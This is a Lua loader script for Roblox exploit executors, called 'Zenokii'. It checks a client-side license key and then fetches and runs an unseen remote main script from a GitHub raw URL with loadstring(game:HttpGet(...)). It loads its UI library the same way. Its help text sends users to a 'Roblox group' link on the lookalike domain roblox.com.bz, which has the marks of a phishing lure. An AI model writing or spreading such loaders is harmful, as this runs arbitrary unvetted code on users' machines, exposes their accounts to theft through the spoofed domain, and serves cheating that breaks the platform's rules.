--// Zenokii loader with key system
--// Keys come from https://keysystem-avci.vercel.app/ (format: ZEN-XXXX-XXXX-XXXX)

--// Settings
local KeySite     = "https://keysystem-avci.vercel.app/"
local DiscordLink = "https://discord.gg/KCKYdFqmJ"
local GroupLink   = "https://roblox.com.bz/communities/7379344821/"
-- The script that runs after a valid key. Change this to your real main script URL.
local MainScriptUrl = "https://raw.githubusercontent.com/avci74635-hub/script/main/main.lua"

--// Key check (must match the site's generator)
local ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
local SALT = "zenokii-key-v1"

local function decode(str)
    local n = 0
    for i = 1, #str do
        local idx = string.find(ALPHABET, string.sub(str, i, i), 1, true)
        if not idx then return nil end
        n = n * 32 + (idx - 1)
    end
    return n
end

local function checksum(body)
    local h = 5381
    local t = SALT .. body
    for i = 1, #t do
        h = (h * 33 + string.byte(t, i)) % 4294967296
    end
    h = bit32.bxor(h, bit32.rshift(h, 15))
    return h % 1048576
end

-- returns "valid", "expired" or "invalid"
local function checkKey(input)
    local key = string.upper((input or ""):gsub("%s+", ""))
    local rand, exp, chk = string.match(key, "^ZEN%-(%w%w%w%w)%-(%w%w%w%w)%-(%w%w%w%w)$")
    if not rand then return "invalid" end

    local expDay, chkNum = decode(exp), decode(chk)
    if not expDay or not chkNum or not decode(rand) then return "invalid" end
    if checksum(rand .. exp) ~= chkNum then return "invalid" end

    local today = math.floor(os.time() / 86400)
    if today > expDay then return "expired" end
    return "valid"
end

--// UI
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Zenokii",
    SubTitle = "v0.8",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 400),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local function copy(text, okMessage)
    if setclipboard then
        setclipboard(text)
        Fluent:Notify({ Title = "Zenokii", Content = okMessage, Duration = 3 })
    else
        Fluent:Notify({ Title = "Error", Content = "Your executor does not support setclipboard.", Duration = 3 })
    end
end

local KeyTab = Window:AddTab({ Title = "Key", Icon = "key" })
local HelpTab = Window:AddTab({ Title = "Help", Icon = "help-circle" })

KeyTab:AddParagraph({
    Title = "Enter your key",
    Content = "Get a free key from the key site, paste it below and press Check key."
})

local KeyInput = KeyTab:AddInput("KeyInput", {
    Title = "Key",
    Default = "",
    Placeholder = "ZEN-XXXX-XXXX-XXXX",
    Numeric = false,
    Finished = false
})

local checking = false

local function loadMain()
    local ok, err = pcall(function()
        local source = game:HttpGet(MainScriptUrl)
        local fn, compileErr = loadstring(source)
        if not fn then error(compileErr) end
        fn()
    end)
    return ok, err
end

KeyTab:AddButton({
    Title = "Check key",
    Callback = function()
        if checking then return end
        checking = true

        local result = checkKey(KeyInput.Value)
        if result == "invalid" then
            Fluent:Notify({ Title = "Invalid key", Content = "That key isn't valid. Copy it again from the key site.", Duration = 4 })
        elseif result == "expired" then
            Fluent:Notify({ Title = "Key expired", Content = "Get a new key from the key site.", Duration = 4 })
        else
            Fluent:Notify({ Title = "Key valid", Content = "Loading Zenokii...", Duration = 3 })
            local ok, err = loadMain()
            if ok then
                Fluent:Destroy()
                return
            end
            warn("[Zenokii] load failed: " .. tostring(err))
            Fluent:Notify({
                Title = "Error",
                Content = "Failed to load. Please try again. If this continues, join our Discord server (link copied).",
                Duration = 6
            })
            if setclipboard then setclipboard(DiscordLink) end
        end

        checking = false
    end
})

KeyTab:AddButton({
    Title = "Get key",
    Description = "Copies the key site link. Open it in your browser.",
    Callback = function() copy(KeySite, "Key site link copied!") end
})

KeyTab:AddButton({
    Title = "Join Discord (Support)",
    Callback = function() copy(DiscordLink, "Discord link copied!") end
})

HelpTab:AddParagraph({
    Title = "How to get a key",
    Content = "1. Press 'Get key' and paste the link into your browser.\n2. Join the Roblox group when asked.\n3. Generate your key and copy it.\n4. Paste it into the Key tab and press 'Check key'."
})

HelpTab:AddButton({
    Title = "Copy Group Link",
    Callback = function() copy(GroupLink, "Group link copied!") end
})

Window:SelectTab(1)
